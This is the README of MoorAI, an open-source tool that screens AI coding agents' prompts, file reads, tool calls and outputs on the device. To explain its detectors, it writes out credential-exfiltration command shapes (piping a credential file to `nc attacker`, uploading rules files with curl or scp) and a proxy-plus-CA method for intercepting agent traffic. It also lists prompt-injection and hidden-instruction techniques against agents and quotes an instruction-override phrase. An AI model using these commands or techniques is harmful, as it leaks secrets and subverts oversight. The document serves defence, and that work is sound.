<div align="center">

# MoorAI

### On-device guardrails for AI coding agents. Nothing leaves the machine.

[![License: MIT](https://img.shields.io/badge/License-MIT-3ecf8e.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-e4e4ef.svg)](#install)
[![Build: Windows](https://github.com/gitayg/moorai/actions/workflows/release-windows.yml/badge.svg)](https://github.com/gitayg/moorai/actions)

**MoorAI reviews what your developers send to AI coding agents — and what those agents read, run, and reply — right on the device, before anything is exposed.** Secrets, PII, and source code never leave the machine to be checked. Your security team sees content-free signals, never the prompts.

Let your engineers use AI freely. Keep your data in-house.

</div>

---

## The problem

Your developers use Claude Code, Cursor, and Copilot. Those agents don't just read what's typed — they **read files into context** (a stray `.env`), **call MCP tools** with whatever arguments they were given, and **reply** with whatever the model generates. Prompt review alone misses most of it, and every cloud DLP tool solves it by **sending your prompts to their servers to inspect**.

That's the exact trade MoorAI refuses.

## What it does

- **Context interception** — blocks a secret or PII being *read into the agent's context* (e.g. an agent slurping a `.env`), not just typed in a prompt. Via the agent's PreToolUse hooks, on-device. What comes back into the agent — command output, MCP results, sub-agent reports, fetched pages — is scanned after the tool runs as untrusted inbound content.
- **Agency Enforcement** — bounds what an agent is *allowed to do*: inspects `mcp__*` tool-call arguments for secrets/policy violations and blocks them, and enforces an approved-MCP-server allow-list at call time — with a **discovered → approved/denied approval-gating lifecycle** in the console. The direct control for **OWASP LLM06: Excessive Agency**.
- **AI output review** — reviews what the agent says *back*, not just what's typed. On-device output screening flags **secrets, PII, and insecure code the agent generates** (SQL injection, XSS, command injection, `eval`/dynamic exec, weak crypto, unsafe deserialization) and masks secret spans on the `-p` path — emitting only a content-free verdict, never the reply. An intra-file **taint-lite** check (dependency-free source→sink proximity) raises a high-confidence *confirmed tainted-flow* signal when untrusted input actually reaches one of those sinks, so the console can prioritize real flows over hardcoded-literal matches.
- **Battle-tested secrets engine** — ~14 provider families (GitHub, AWS, Stripe, Slack, GCP, OpenAI/Anthropic, DB connection strings, …) plus Shannon-entropy scoring with an allowlist (UUIDs, git SHAs, base64) so it doesn't false-positive on the things that aren't secrets.
- **Model-endpoint allow-listing** — bounds *which LLM endpoints* an agent may talk to. A base-URL override (`ANTHROPIC_BASE_URL=…`) or a direct call to a non-approved provider is flagged/blocked at the endpoint — the exfil-via-rogue-endpoint defense, host-level and content-free (loopback / local models always allowed).
- **Transit-override detection (#67)** — the allow-list above asks *where* the agent is sending; this asks *what the traffic passes through on the way*. Setting `HTTPS_PROXY` plus a CA override (`NODE_EXTRA_CA_CERTS`, `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, …) on an agent leaves the destination untouched — so the endpoint allow-list still passes it — while every request transits an interceptor that reads the prompt, the generated code and the API key in cleartext. Measured, not theorised: with those two variables set, a real Claude Code session decrypted at the proxy with the client reporting the TLS as **authorized**, because the injected CA makes the forged chain legitimately trusted. It needs no privileges. MoorAI reports any proxy or CA override and denies an unsanctioned proxy when `policy.transitAllow` is set — proxy **host** and variable **name** only, never the CA path or its contents. Report-first by default, because a corporate egress proxy is legitimate; loopback is deliberately *not* auto-approved, since a loopback proxy is what an on-device interceptor looks like.
- **Slopsquatting firewall** — an offline typosquat / hallucinated-package classifier (Damerau-Levenshtein against a curated popular-package list + a known-bad set) gates `npm/pip/cargo install` of near-miss names (`reqeusts`, `lodahs`) and documented hallucinations — the #1 AI-supply-chain threat, checked entirely on-device (name only).
- **MCP hardening** — an approval-gating lifecycle for MCP servers, **rug-pull detection** (a server whose config changes after approval is knocked back to pending), an **invisible-payload scanner** (Unicode tag-block / ANSI escapes / bidi-override / variation-selector smuggling) that catches instructions hidden from human review, and a tool-description check that reports a tool telling the model to read a credential file (`~/.ssh/id_rsa`, `~/.aws/credentials`, `.env`, a browser or keychain store) and pass its contents into a call.
- **Skill Analysis** — an inventory + *intent* view of the whole **skill surface** an agent auto-loads, not just its rules file: `SKILL.md` and `.claude/skills/**`, subagent definitions (`.claude/agents/*.md`), slash commands (`.claude/commands/**`), MCP server configs (`.mcp.json`, `~/.claude.json`, `managed-mcp.json`, `claude_desktop_config.json`), the settings files that can carry **hooks** (`.claude/settings.json`, `settings.local.json`, `managed-settings.json`), plugin manifests and their hook/monitor declarations, path-scoped rules and memory files, plus the other vendors' equivalents (`.cursorrules`, `.windsurfrules`, `.clinerules`, copilot-instructions). Every file gets its **kind**, a set of **intent category labels** — *hidden-instructions*, *instruction-override*, *external-network-egress*, *security-control-or-privilege-change*, *references-credentials*, *invisible-characters*, … — and a **drift fingerprint** per file. The labels are renames of findings the existing detection engine already produced; **no text, matched span, or excerpt is ever attached**, so a poisoned skill can be triaged without reading it off the device.
- **Per-agent destination map** — the observed counterpart to your allow-lists: for each agent/tool, *which external destinations it actually reached*. **Hosts** (never a URL path or query string — they are not captured in the first place) and **MCP server names**, with call counts, first/last-seen, and the allow/ask/deny verdict each call actually got. Kept in an on-device ledger; the console gets one content-free alert the first time an agent touches a new destination, over the existing alert path. View it with `moorai-destinations`.
- **Agent entitlement envelope** — declare each agent's authorized tools / path-prefixes / MCP servers; an action outside the envelope is flagged as **entitlement drift** and alerted or blocked — least-privilege for coding agents, content-free.
- **Intent alignment** — flags a risky agent action aimed at something the user's own request never mentioned: an upload to a host the prompt never named, a destructive command or credential read on paths it never named, an MCP write to a service it never named. The `UserPromptSubmit` hook keeps only keyed, device-local hashes of the sites, paths, service names and three labels (*credentials*, *destructive*, *mcp-write*) a prompt mentions — never the prompt. Report-only by default (`policy.intentAlignment: "ask"` raises the call to ask, `"off"` disables it). Lexical, and Claude Code only — limits below.
- **Protected-instruction leak detection (#52)** — reports the rules files an agent runs under (`CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, Copilot, Cursor, Windsurf and Cline rules) leaving the device through the agent: reproduced in what it writes or sends, or uploaded by path (`curl -d "$(cat CLAUDE.md)"`, `gh gist create AGENTS.md`). The files are fingerprinted on-device as keyed hashes of 7-word shingles; no text is stored. Editing the rules file itself, quoting a line or two, and template boilerplate stay silent.
- **MCP server reputation** — scores an MCP server 0-100 the first time it is seen (bands good / fair / poor / bad) from its package name, its launch command and the copy npx already installed, plus, opt-in, a registry lookup (which also checks that the package's declared repository is really its own, from registry provenance or the repository's own manifest) and SkillTriage's published verdicts. A content-free alert carries the score, band and reason codes; `mcpReputation.blockBelow` refuses a low-scoring server. Details in [`mcp-proxy/README.md`](mcp-proxy/README.md).
- **Local secret-egress detection** — fingerprints your local secret values (`.env`, cloud creds) on-device as keyed one-way hashes and blocks an outbound command or tool-call that carries one verbatim — catching a real secret leaving even when it isn't in a recognizable token shape. Only the hash + a verdict leave.
- **Insecure-defaults screening** — flags misconfigurations agents habitually emit (SSRF, path traversal, XXE, JWT `alg=none`, TLS-verify-off, wildcard CORS, `debug=True`, insecure randomness for tokens, hardcoded creds, world-writable perms, open redirect) — on top of the SQLi/XSS/RCE/deserialization coverage.
- **Sub-agent / A2A oversight** — records agent-to-agent delegation (sub-agent spawns), scans the delegated prompt for injection, and applies the parent's entitlement envelope to the child so a delegated action can't slip past the parent's controls.
- **MITRE ATLAS agent techniques (v2026.09)** — a link that opens an assistant with a prompt already filled in through `?q=` (`AML.T0131`), ingested content that asks the agent to enumerate its own tools and permissions (`AML.T0133`), a block addressed only to AI clients that contradicts the visible page (`AML.T0134`), markup that renders steering text invisible — same colour as its background, zero font size, a hidden element (`AML.T0068`), an image or link preview whose URL carries conversation data (`AML.T0077`), and directives planted in a file's EXIF, XMP, ID3 or PDF metadata (`AML.T0129`) — the part of a binary file that carries a sentence. Each needs two independent signals to fire, so an ordinary assistant link, a hidden template row or a CI badge stays silent. Cloaking's server-side differential, and instructions hidden in image pixels, audio or video, are **not** covered — see [DETECTION_ENGINE.md §14](docs/DETECTION_ENGINE.md).
- **Jailbreak & injection detection** — high-precision detectors for direct jailbreaks (DAN lineage, developer/god-mode, named personas, chat-template control-token injection) scoped so normal dev prompts don't trip them, with opportunistic local-model escalation on ambiguity.
- **Coach · alert · mask · block · justify · kill** — per policy, per tenant, per device. Nudge, warn, replace a secret or PII span with a content-free tag and let the call proceed, hard-block, require a signed justification, or **kill the session** — terminate the running agent (not just deny the one call) on a critical finding, in both the `-p` guard and the interactive host.
- **Coach-as-literacy (EU AI Act Art. 4)** — each time MoorAI coaches a developer at the point of use (the *why* + *what-to-do*, mapped to OWASP LLM Top 10 / MITRE ATLAS), it records a **content-free "literacy touchpoint"** (topic + actor hash, never content). The console rolls these into a coverage view — demonstrable evidence of "measures taken" for a training program, not a substitute for one.
- **Context-aware severity** — the same pattern is scored higher by *where* it was caught: a secret read into an agent's context or shipped as an MCP argument outranks one typed into a still-editable prompt.
- **On-device exposure ledger** — a content-free local log of which credential/secret *classes* reached which agent, so an incident-response rotation is targeted, not a blanket burn. Plus a human-override *intent* log — the signal that separates legitimate agentic use from an attack. View both with `moorai-ledger`; nothing leaves the machine.
- **On-device, content-free** — everything is checked locally. The console receives a category, a risk level, and a **keyed** one-way hash (HMAC-SHA-256 under your tenant's enrollment token) — **never** the prompt, the file, or the matched span. The key matters: an *unkeyed* digest of a phone number or an SSN is enumerable, so it is not one-way in practice. A device with no enrollment token emits an explicit non-correlatable marker instead of a weaker hash.
- **Opportunistic on-device model escalation** — when a regex scan is ambiguous and your policy enables it, a *local* model (Ollama on the loopback interface) gives a second opinion. The text goes only to `127.0.0.1`, never off the machine; a failure never changes the decision. Off by default.
- **You control the evidence** — nothing trains anyone's model, and on-device signal logs are pruned on your schedule (`MOORAI_RETENTION_DAYS`, default 90; `0` = keep forever). Content-free by construction, not by promise.

## Why you can trust the "nothing leaves" claim

Because you can read the code. The agent is **MIT and open source** — the whole detection and reporting path is right here. Cloud DLP tools ask you to take "we don't store your prompts" on faith. MoorAI's telemetry is content-free *by construction*, and the construction is auditable.

**Governance without surveillance.**

## Install

**macOS (Apple silicon)** — download the `.dmg` from [app.moorai.dev/download/app](https://app.moorai.dev/download/app) (it is not attached to GitHub Releases), or `brew install --cask gitayg/tap/moorai` — see [packaging/README.md](packaging/README.md). The app updates itself in place.
**Windows** — download the signed `-setup.exe` from [Releases](https://github.com/gitayg/moorai/releases) (built in the open by CI).

Community edition: runs standalone, no account required. **Without enrollment MoorAI coaches**: it runs the
same detection and built-in defaults, and shows you (and, where the agent's hook protocol allows, the agent)
what it caught and the safer way to do it — it never blocks, never asks for sign-off, never ends a session
and posts nothing anywhere. **Blocking, sign-off and session kill apply once the device is enrolled** in a
MoorAI console (free up to 200 users).

### Enroll a device in a management account

Two ways, both in the app's settings panel (the gear in the status bar):

- **Create an account from inside the app** — enter an organisation/admin name and an email,
  press **Create account**, then click the verification link in the email that arrives. The app
  waits on that click and enrolls itself the moment it lands; there is no token to copy. The app
  polls by a single-use, 30-minute claim token only — your email address is never sent back to the
  server, so the wait cannot be used to ask whether some address has an account.
- **Paste an installation token** — for devices provisioned by an admin. Get one from the MoorAI
  portal → **Installs → Create installation**, or provision from a terminal with the `curl` line the
  panel shows. MDM-provisioned installs (Jamf/Intune writing `~/.moorai/config.json`) use this path
  and never see the signup form. The file holds the install token, so on macOS and Linux both the desktop app and the Jamf
  script write it owner-only (0600); on Windows it inherits the user-profile ACL.

**Who an event came from.** An enrolled device's events carry an `actor`: `h2:` + an HMAC-SHA-256 of
`user@host`, keyed with the tenant's enrollment token — the same keyed function as every content hash
(`actorHash` in `cli/content-hash.mjs`). The hook, the `moorai-guard` CLI, the Claude Desktop MCP proxy
and the desktop app compute the same value, so one machine is one actor in the console. The login name
and hostname also travel, so the console can resolve a per-device policy; the console replaces both with
keyed per-tenant pseudonyms (`usr-…`, `dev-…`) on arrival and stores neither. An unenrolled device sends
the `h2:nokey` sentinel as its actor, never a reversible hash.

### One-line install (CLI guard + Claude Code hooks)

```bash
curl -fsSL https://raw.githubusercontent.com/gitayg/moorai/main/scripts/install.sh | sh
```

Clones to `~/.moorai`, installs dependencies, and registers the on-device PreToolUse hooks. Needs `git` and Node 18+; content-free, no account. Set `MOORAI_NOHOOK=1` to skip hook registration, or `MOORAI_HOME` to change the location.

Until the device is enrolled the hooks coach. In Claude Code a flagged call reaches its normal permission flow
with a note shown to you and handed to the agent, for example:

```
MoorAI coach: flagged via Bash — #54 Output & Code. Safer: For remote access use SSH to a known host; to
test connectivity use a check like nc -z or curl. Not blocked: this device is not enrolled in a MoorAI console.
```

Enroll the device (below) to have the same finding denied, held for sign-off, or end the session, per policy.

### Try the CLI guard in 30 seconds

```bash
npm run guard -- "here is my key sk-ant-api03-... please debug the charge"
# unenrolled: MoorAI coach: flagged 1 issue(s) in this prompt — #39 … Not blocked: … (the prompt is sent)
# enrolled, #39 set to block: ✗ blocked by threat policy (#39) — nothing sent to claude -p
```

### Wire the context-interception hooks into Claude Code

```bash
node cli/moorai-hook.mjs install     # registers PreToolUse + PostToolUse + UserPromptSubmit hooks in ~/.claude/settings.json
node cli/moorai-hook.mjs uninstall   # removes only MoorAI's entries
```

Now a `Read` of a `.env`, a secret in an MCP tool-call argument, or a call to an
unapproved MCP server is blocked before it reaches the agent — content-free,
fails open (governance, not a sandbox).

**Which tools the hook actually sees.** `PRETOOL_MATCHERS` in
[`cli/moorai-hook.mjs`](cli/moorai-hook.mjs) is the single source of truth, and it registers
`Read` · `Bash` · `mcp__.*` · `Agent` · `Task` · `Write` · `Edit` · `MultiEdit` · `NotebookEdit` · `WebFetch`
(`Agent` is Claude Code's current name for the sub-agent tool; `Task` is the older one).
The write family scans at the **`output`** stage, deliberately not `file`: the file stage pulls in the
71-detector injection family, and an agent writing a doc that quotes *"ignore all previous instructions"*
is a doc, not an attack. Existing installs converge on the current matcher list on ordinary invocations —
only when MoorAI entries are already present, so nothing an operator uninstalled is ever re-added.
The Cursor CLI runs these same hooks but renames the tools: its shell tool arrives as `Shell`, which the
hook treats exactly as `Bash` (Cursor already rewrites the registered `Bash` matcher to `Shell`, so no
extra matcher is registered). A `Read` is also checked against #55 by **path**, so reading a `.env` —
relative, absolute or `~/…`, including `.env.local` / `.env.production` — gets the same `ask` as
`cat .env`; `.env.example` / `.env.sample` / `.env.template` are not flagged.

**Other agents.** `node cli/moorai-agent-hook.mjs <codex|copilot|gemini|cursor> install` registers a
pre-tool hook in that agent's own config (`~/.codex/hooks.json`, `~/.copilot/hooks/moorai.json`,
`~/.gemini/settings.json`, `~/.cursor/hooks.json`); `uninstall` removes only MoorAI's entries. Each
adapter in [`cli/agent-hooks/`](cli/agent-hooks) translates the agent's hook payload into the Claude
Code shape, runs the same hook (same engine, policy and telemetry), and translates the verdict back.
Each was built from that vendor's documentation and published source, and is tested against fixture
payloads in the documented shape; none has yet been run end to end against the live agent. Per agent:

| Agent | Blocks before the tool runs | "Ask" | Known gaps |
|---|---|---|---|
| Codex CLI | yes, after the user trusts the hook once in Codex (`/hooks`) | not supported by Codex; becomes a deny with a message | `web_search` runs server-side and never reaches a hook; plan/permission/plugin tools unmapped |
| GitHub Copilot CLI | yes | passed through (Copilot's own prompt; denied when no user is present) | `grep`/`glob` results, skill and agent-messaging tools unmapped; long MCP names can be truncated by Copilot |
| Gemini CLI | yes | passed through (Gemini's confirmation prompt) | `glob`/`grep_search`/`list_directory` unmapped; only web results are scanned after the tool runs |
| Cursor (IDE and `cursor-agent`) | yes, for shell, MCP, file reads, writes, fetch and subagents | shell and MCP only; `cursor-agent` lets an MCP "ask" through | prompts (`beforeSubmitPrompt`) and several `preToolUse` tools unmapped; fails open on a hook crash |

All four fail open if the hook crashes or times out, like the Claude Code hook.

`WebFetch` is covered on **both** surfaces, and the split is the point. `PreToolUse` fires *before* the
fetch, so `tool_input` is `{url, prompt}` and the page does not exist yet — that surface scans the
**outbound request** at the **`prompt`** stage and can deny it.

**What comes back into the agent is scanned too.** The `PostToolUse` registration has six matchers:
`WebFetch` · `WebSearch` · `Bash` · `Agent` · `Task` · `mcp__.*`. A `curl`'d page, a `cat`'d file from a
cloned repository, an MCP server's response and a sub-agent's report are scanned at the **`output`**
stage as inbound content, within a 64 KB window. That surface **cannot un-run the tool**: per the Claude
Code hooks reference, a `PostToolUse` block only adds a reason next to the result, and Claude still sees
the original output. By default it reports; a policy `ask` becomes advisory `additionalContext` telling
the model to treat the output as data, not instructions; an unenrolled device coaches. On `Bash`, MCP and
sub-agent results, detectors that judge actions or generated code (#29, #44, #45, #52, #54, #55, #57, #61,
#62, #63, #69, #76) are dropped, because `PreToolUse` enforces those when the agent actually attempts
the act, and the #15 and #17 gates are narrowed for developer files. Sub-agent results are judged on
their report only; background launches and image output are skipped. Measured on 1,041 benign samples
(corpus, real command outputs and `node_modules` files): alerting 366 → 148, benign advisories 55 → 0,
benign blocks 5 → 0; attacks alerting 48/87 → 45/87. It costs one extra hook process per `Bash`, MCP or
sub-agent call, about 82 ms at p50. Limits: `PowerShell` output is not scanned, output beyond 64 KB is
not scanned, `cat .env` reports at both `PreToolUse` and `PostToolUse`, the other agents' adapters still
forward only web results, and the recall figures are in-sample. `Glob` and `Grep` remain unregistered.
Full stage-and-surface map: [`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §6–7.

**Mask instead of block.** An org can set the policy action `mask` for a data-tier threat (#15 PII, #39
secrets, #1 payment card, #44 PHI), per threat (`threatPolicy`) or per tier (`tierPolicy.secret` / `pii` /
`regulated`). MoorAI then replaces the matched span with `[MOORAI:<tier>:<8 letters>]`, derived from the
keyed content hash so no part of the value survives, re-scans the rewritten text, and lets the call
proceed. It rewrites the `Bash` command, `Write`/`Edit`/`NotebookEdit` content, `MultiEdit`'s
`new_string`, the `WebFetch` url and prompt, every MCP argument string and the `Task` prompt through
`PreToolUse` `updatedInput`, sent with no permission decision so a mask never auto-approves a call, and
the six post-tool results through `PostToolUse` `updatedToolOutput`. Where it cannot rewrite, it falls
back to `policy.maskFallback` (`notify` / `justify` / `block`), else to the action the threat would have
had: a `Read`, the files a `Bash` command reads, the other agents' adapters, Cursor's renamed tools, an
unenrolled device, a mask the re-scan does not confirm, and values over 256 KB. Each mask posts a
content-free `Sensitive span masked` alert. Limits: not yet observed in a live Claude Code session (built
from the hooks reference and the shipped binary); another hook's `updatedToolOutput` can override it,
because the last one wins; the desktop app treats `mask` as report-only; and the console policy editor
may not offer it yet.

**The context an agent auto-loads is screened too.** A detached worker runs the engine's `index` stage
over the files the agent pulls in on its own — `CLAUDE.md`, `AGENTS.md`, `.mcp.json` and their siblings.
On by default, off with `policy.indexScan: false`, and off the hot path so it cannot change a verdict.
`.claude/skills/**` and `.claude/agents/*.md` are **not** in that ingest surface; they are covered by
Skill Analysis on load, below.

**The user's prompt is read for one purpose: intent alignment.** The hook registers `UserPromptSubmit`
(existing installs pick it up on the next hook call). It does not scan the prompt with the detection
engine and never blocks one. From prompts a person wrote (machine-injected `system` and `poll_event`
turns are skipped) it stores HMACs, under a device key in `~/.moorai/intent.key`, of the sites, paths,
service names and labels the prompt mentions, in `~/.moorai/intent-alignment.json` (both 0600; 64
sessions, 24 h, 512 features). Only calls that are already risky are judged: a `Bash` upload to a
non-loopback host, a #43 destructive command, a #55 credential read, an MCP tool whose name is a write.
An upload is aligned only if every destination site was named; a label never excuses one. A session
with no captured task is never judged. A misaligned call posts one content-free alert per session,
class and target (#64, `Action outside the stated task`, counts only). `policy.intentAlignment` is
`"report"` (default), `"ask"` (opt-in; raises an allow to ask) or `"off"`; an unenrolled device coaches.
With `modelEscalation` and `semanticEscalation` both on, the loopback model also labels the prompt at
capture time, bounded by `MOORAI_INTENT_TIMEOUT_MS` (default 1500). Limits: it is lexical, not semantic,
so an upload to a host the user named passes; text pasted into a prompt widens the task; the agent runs
as the same user and can tamper with the state file; `Write`/`Edit`, data in a GET query string and
`git push` to a new remote are not judged; the Codex, Cursor, Gemini and Copilot adapters do not forward
prompts, so it is Claude Code only; and it adds one hook process per prompt (p50 119–190 ms across two
runs on one machine). Full contract: [`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §6.

**Protected instructions are fingerprinted, never copied.** The hook discovers the rules files the agent
runs under (`CLAUDE.md`, `.claude/CLAUDE.md`, `CLAUDE.local.md`, `.claude/rules/`, managed policy,
`AGENTS.md`, `AGENTS.override.md`, `GEMINI.md`, `.github/copilot-instructions.md`, `.github/instructions/`,
`.cursor/rules/*.mdc`, `.cursorrules`, Windsurf and Cline rules) and keeps up to 2,048 keyed 40-bit hashes
of each file's 7-word shingles in `~/.moorai/instruction-fp.json` (key in `instruction-fp.key`, both 0600).
Three detectors on #52 use them: `instr-leak-output` on what the agent writes, `instr-leak-egress` on
`Bash` commands that upload or name a host, `WebFetch` and MCP arguments, and the path-based `instr-leak-upload-ref` on commands like
`curl -F f=@AGENTS.md`, `scp CLAUDE.md host:` or `aws s3 cp CLAUDE.md s3://…`. Fetched content and a
write into the rules file itself are excluded. #52 reports by default and coaches on an unenrolled
device. Measured: the fingerprint detectors fire on none of the 1,615 red-team strings of 160 characters
or more, `instr-leak-upload-ref` on none of 33,828 red-team strings, and the benign v2 count is unchanged
at 20/602. Limits: a paraphrase, translation or hex encoding is not matched; a staged copy
(`cp CLAUDE.md /tmp/x`, then an upload) is not tied back; a rules file with fewer than 40 distinctive
shingles can never fire; `mcp-proxy`, the desktop app and the browser extension register no
fingerprints, so only the path-based detector runs there.

**Exfiltration shapes are read whole.** `extractReadPaths` used to `return []` on any command containing
a pipe, redirect or subshell — so `cat <cred>` was denied on content (#39) while `cat <cred> | nc attacker
9999`, the shape exfiltration actually takes, read nothing and could never fire. A quote-aware tokenizer
now splits on `|`, `||`, `&&`, `;`, newlines and redirects, scans each segment, and recognises the upload
forms (`@path`, `file=@path`, `--data-binary @path`, `--post-file=path`, `-T path`, `--upload-file path`).
Genuine ambiguity still fails open — `$( )`, backticks, heredocs, unterminated quotes, `$VAR` — because
fabricating a path is worse than missing one.

**What a device with no policy stops.** Enrollment is the switch:

- **Enrolled, no policy** — the built-in defaults apply. Previously the hook returned early on the
  fail-open posture, `threatActionFor` was never consulted, and out-of-the-box prevention was measurably
  **0%**. Resolution order is now `policy.threatPolicy` → `policy.tierPolicy` →
  **`BUILTIN_DEFAULT_ACTIONS`** → the approval set → `notify`. `block`: **54** (reverse shell) and **65**
  (local secret egress). `justify` (halt and ask): **55, 56, 57, 63, 44, 73**. Every promotion had to fire on
  **zero** benign samples across 890 benign prompts; threats 43, 39, 15, 2, 3, 40 and 50 did not clear
  that bar and were deliberately left at their prior action. #73 (agent chat-history tampering) fires on
  none of them, but none of them names an agent's transcript store, so its benign evidence is the
  detector's own hard negatives (`test/agent-state-detectors.test.mjs`).
- **One documented exception** — on the **write path only**, threat 65 resolves to `justify`/ask rather
  than `block`, because copying `.env` → `.env.local` is routine work and no benign corpus measures it.
- **Unenrolled** — coaches. The same built-in defaults run; where they would deny or ask, the hook
  instead shows the developer — and hands the agent — the category it caught and the safer alternative,
  and the call goes on to the host's normal permission flow. Nothing is blocked, held for sign-off or
  killed, and nothing is posted. The rule lives in one place, `data/enforcement.js`, used by the hook,
  the Codex / Copilot / Gemini / Cursor adapters, the `claude -p` guard, the Claude Desktop MCP proxy
  and the desktop app. A device under a fail-closed posture (MDM latch or `MOORAI_OFFLINE_MODE`) keeps
  enforcing without a token, so removing the token is not a way out of an org's policy.
- **Enrolled** — an org policy wins in both directions: a tenant can soften any built-in default or
  harden a threat the map omits.

### Skill Analysis — what is your agent actually being told to do?

No separate command: the analysis runs inside the same PreToolUse hooks. Whenever the agent loads a
file on its skill surface, MoorAI emits one content-free record carrying the file's **kind**, its
**intent labels**, and a per-file **drift fingerprint** — `Skill-file poisoning` when the injection
detectors fire in it, `Skill-file drift` when it changed since MoorAI last saw it, `Skill-file intent`
otherwise.

**Limits, stated plainly.**

- **Intent coverage is exactly detector coverage.** Every label is a rename of an existing threat id,
  content tell, or host extraction — there is deliberately no second detection engine here, because a
  forked engine would sit outside `threatActionFor` and your detector packs. An instruction the engine
  has no detector for produces no label: **"no labels" means "nothing the engine recognizes", not
  "benign"**.
- **Files are seen when the agent loads them**, via the Read/Bash hooks. MoorAI does not walk the
  filesystem inventorying skill files that no agent has touched, so a freshly poisoned file is flagged
  on first load, not before it.
- **The drift fingerprint is an unkeyed DJB2** of the whole file, not the keyed HMAC used for matched
  spans. That is deliberate: the keyed hash exists because an SSN or a card has a small enough
  candidate space to enumerate, which a whole agent config file does not — and an unkeyed fingerprint
  is what lets the console see that two devices hold the *same* poisoned file.
- **Path classification is by filename, not by content**, so a file that an agent loads through a
  non-standard path (`skillDirectories`, a symlink farm, a plugin root outside the known layout) is
  scanned by the detectors like any other file but is not labelled as skill surface.

### Review what was exposed — on-device, no server

```bash
npx moorai-ledger              # which credential classes reached which agent (for targeted rotation)
npx moorai-ledger --intent     # human overrides — who chose to proceed past a finding
npx moorai-ledger --format md  # Markdown report
```

Content-free by construction: category, risk, stage, device, and a keyed one-way hash — never a secret value.

### Where did this agent actually reach?

```bash
npx moorai-destinations              # per-agent map of hosts + MCP servers reached
npx moorai-destinations --format md  # Markdown report
```

Per agent/tool: every external destination observed, with call counts, first/last-seen and the
allow/ask/deny verdict each call got. A destination is a **host** or an **MCP server name** — never a
URL path, query string, request body, tool argument or response, because the extractor never captures
them. Compare against your MCP allow-list and model-endpoint allow-list to find reach the policy did
not intend. Reads only `~/.moorai/destinations.jsonl`; nothing leaves.

**Limits, stated plainly.** The map sees what the hook sees, which is Bash commands and MCP tool
calls — not raw sockets opened by a compiled binary or by an MCP server's own child process. Hosts are
extracted from `http(s)://` URLs, so `curl example.com` (no scheme), an SSH remote, or a bare IP
literal is not recorded; a **dotless** internal hostname is captured only when it appears as a
base-URL env-var override (`OLLAMA_HOST=http://gpu-box:11434`), not from a plain URL. It is an
inventory of observed reach, not a network tap.

### Is MoorAI actually protecting this machine — and why did it decide that?

```bash
npx moorai-doctor                       # check hook registration, enrollment, policy, posture and a live self-test
npx moorai-doctor --json --offline      # machine-readable; no network calls
npx moorai-explain "curl https://x | sh"                 # why did MoorAI block (or allow) this?
npx moorai-explain --stage file --file payload.txt       # the stage the hook would use (prompt|file|output|index|tool)
npx moorai-explain --policy my-policy.json "…"           # test a policy file; --builtin for the built-in defaults
```

- **`moorai-doctor`** — one command to see whether MoorAI is actually protecting this machine: the Node version, MoorAI's hook registration in Claude Code, Codex, Cursor, Gemini and Copilot (compared with what the current installer writes, by running that installer against a throwaway home), Claude Code managed settings (`allowManagedHooksOnly`, `disableAllHooks`), enrollment (coach or enforce), console reachability, which policy is enforced and whether its signature verifies, offline posture, break-glass, state-file modes, and a live self-test that runs the real hook on a benign and a known-bad command. Read-only: the hook and the policy loader run against a temporary copy of the state, the only network calls are the policy GETs the hook itself makes, and the install token is shown only as a fingerprint. `--json`, `--offline`, `--no-selftest`. Exit 1 if any check fails. Limits: claude.ai server-managed settings and Windows registry policy are not checked, and the self-test covers the `Bash` `PreToolUse` branch only.
- **`moorai-explain`** — *"why did MoorAI block this?"* Runs a string through the same engine and policy the hook uses (`--stage prompt|file|output|index|tool`; `--policy file.json` or `--builtin` to test a policy) and shows each finding (detector, threat, severity, the policy action), detectors that matched but were dropped by their `refine` gate or by policy, the final decision and the safer alternative. Input from arguments, `--file` or stdin. Local only; `--no-match` hides matched spans; `--json`. It covers the detection engine and policy only, not the hook's per-tool checks (credential paths, the MCP gateway and reputation, intent alignment).

### Verify your policy catches the attacks — on your own machine

```bash
npx moorai-redteam             # run the adversarial corpus against YOUR active policy
npx moorai-redteam --format json
```

Runs a built-in adversarial corpus (prompt injection, jailbreaks, secrets/PII, license, destructive
commands) locally and reports, per attack class, whether your live policy actually **acts** on it —
not just whether the engine can detect it. Verify, don't trust. Content-free; exits non-zero on any gap.

### Is an agent behaving like an autonomous attack?

```bash
npx moorai-agentwatch             # score recent on-device agent activity vs the autonomous signature
npx moorai-agentwatch --emit      # also send a content-free alert to your server → SIEM/SOC
```

Scores recent agent activity against the **8 behavioral tells** the CSA/SANS *Hugging Face Incident
Post-Mortem* (§IV) used to conclude that attack was fully autonomous — repeating already-succeeded
actions, machine-speed bursts, benchmark/decoy strings, LLM-generated obfuscation, leftover opsec
artifacts, and more. Runs on the device; the hook also emits an alert automatically when the signature
trips. Content-free: timestamps, action fingerprints, allow/deny, risk, and tell flags — never content.

### Investigate, discover, attest — three content-free reports

```bash
npx moorai-trace                              # replay the agent's action chain, in order — for incident investigation
npx moorai-shadow --strict                    # find unsanctioned AI (models · MCP servers · editor extensions · running local model servers · AI keys at rest) vs your allow-list
npx moorai-compliance --framework eu-ai-act   # evidence pack mapped to EU AI Act / NIST AI RMF / ISO 42001 controls
npx moorai-compliance --format stix           # export the same findings as a STIX 2.1 bundle for SIEM/TIP interchange
npx moorai-verify-chain                       # tamper-evidence check — detect a deleted, reordered, or edited evidence-log record
npx moorai-honeytokens register               # register a content-free canary (only its one-way hash is stored)
npx moorai-attest                             # export governed records as an in-toto / SLSA provenance attestation (SSCS interchange)
npx moorai-aibom --format cyclonedx           # export the AI Bill of Materials as a CycloneDX 1.6 SBOM (also --format spdx)
npx moorai-scan ./some-skill                  # PRE-INSTALL gate — a content-free verdict on a skill/agent artifact before you install it
npx moorai-scan ./.mcp.json --packages        # …and download + statically analyse the npm/PyPI package each MCP server launches
npx moorai-scan --package npm:@scope/server   # one package (also pypi:<name>, github:<owner>/<repo>[/<skill-path>])
npx moorai-scan --package github:owner/repo   # a whole source repository — an MCP server with no npm/PyPI package
```

- **`moorai-trace`** reconstructs the on-device action chain — `time · actor · tool · decision · risk · destination · args-hash` — from the content-free logs, so you can answer *"what did this agent do?"* after an incident without ever surfacing a prompt or file.
